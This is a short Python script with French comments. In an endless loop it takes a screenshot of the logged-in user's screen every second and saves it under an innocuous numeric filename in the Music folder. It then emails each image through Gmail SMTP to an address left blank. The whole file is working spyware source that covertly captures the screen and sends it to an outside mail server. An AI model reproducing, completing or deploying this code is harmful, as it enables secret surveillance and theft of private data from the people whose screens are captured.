import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import os
import pyautogui
import time  

while 1 == 1:
    #Utilisateur
    users = os.getlogin()

    #Prendre le screeshot
    screen = pyautogui.screenshot(f"C:/Users/{users}/Music/1647897464.png")

    #envoyer le screenshot par mail       
    subject = "screen"
    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg['From'] = " "  
    msg['To'] = " "
    password = " "
    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(f"C:/Users/{users}/Music/1647897464.png", "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename = "C:/Users/{users}/Music/1647897464.png"')
    msg.attach(part)


    smtpserver = 'smtp.gmail.com'
    server=smtplib.SMTP(smtpserver, 587)
    server.ehlo()
    server.starttls()
    server.login(msg["From"], password)
    server.sendmail(msg["From"],msg["To"],msg.as_string())
    server.quit()

    #attendre
    time.sleep(1)
